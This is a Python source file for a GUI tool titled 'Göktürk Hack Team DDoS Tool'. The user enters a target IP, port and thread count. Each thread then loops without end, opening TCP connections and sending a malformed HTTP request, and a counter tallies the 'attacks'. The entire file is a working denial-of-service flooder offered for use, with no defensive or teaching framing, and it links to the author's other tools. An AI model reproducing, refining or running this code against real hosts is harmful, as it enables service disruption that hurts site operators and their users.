import tkinter as tk
import socket
import threading
import os
from webbrowser import open

num = 0

def github():
    open("https://github.com/LordSUCCSES/")

def ddos():
    global num
    ipn = str(ip.get())
    portn = int(port.get())
    while True:
        try:
            ADDR = (ipn, portn)
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect(ADDR)
            data = ("GET / "  + "HTTPS").encode("utf-8")
            [
                "dasjfhgasufygasbfuygasbfyuasgdashdjsaıufhnasıufhbsafa",
                "dasjfhgasufygasbfuygasbfyuasgdashdjsaıufhnasıufhbsafa",
                "dasjfhgasufygasbfuygasbfyuasgdashdjsaıufhnasıufhbsafa",
                "dasjfhgasufygasbfuygasbfyuasgdashdjsaıufhnasıufhbsafa",
                "dasjfhgasufygasbfuygasbfyuasgdashdjsaıufhnasıufhbsafa",
                "dasjfhgasufygasbfuygasbfyuasgdashdjsaıufhnasıufhbsafa"
            ]
            server.send(data)
            server.close()

            num += 1
            attack = "Attack: " + str(num)
            attack_num.config(text=attack)
        except socket.error as e:
            print(f"Error: {e}")

def startattack():
    thread = int(threadtxt.get())
    if thread > 0:
        for i in range(thread):
            t = threading.Thread(target=ddos)
            t.start()


button_style = {
    "font": ("Arial", 10),
    "bg": "#4CAF50",
    "fg": "white",
    "padx": 30,
    "pady": 5,
    "borderwidth": 1,
    "relief": "groove"
}
gbutton_style = {
    "font": ("Arial", 10),
    "bg": "#4CAF50",
    "fg": "Black",
    "padx": 40,
    "pady": 2,
    "borderwidth": 2,
    "relief": "groove"
}

window = tk.Tk()
window.title("Göktürk Hack Team DDoS Tool")
window.geometry("400x380")
iconl = os.getcwd() + "/göktürk.ico"
window.iconbitmap(iconl)
window.resizable(False, False)

ip_label = tk.Label(window, text="IP:")
ip = tk.Entry(window, width=33)
port_label = tk.Label(window, text="Port:")
port = tk.Entry(window, width=33)
thread_label = tk.Label(window, text="Thread:")
threadtxt = tk.Entry()
button = tk.Button(text="Start Attack", command=startattack, **button_style)
attack_num = tk.Label(text="Num: ")
githubbtn = tk.Button(text="Another Tool", **gbutton_style, command=github)

ip_label.pack()
ip.pack()
tk.Label(window, text="").pack()
tk.Label(window, text="").pack()
port_label.pack()
port.pack()
tk.Label(window, text="").pack()
tk.Label(window, text="").pack()
thread_label.pack()
threadtxt.pack()
tk.Label(window, text="").pack()
button.pack()
tk.Label(window, text="").pack()
tk.Label(window, text="").pack()
attack_num.pack()
githubbtn.pack(side="bottom")

window.mainloop()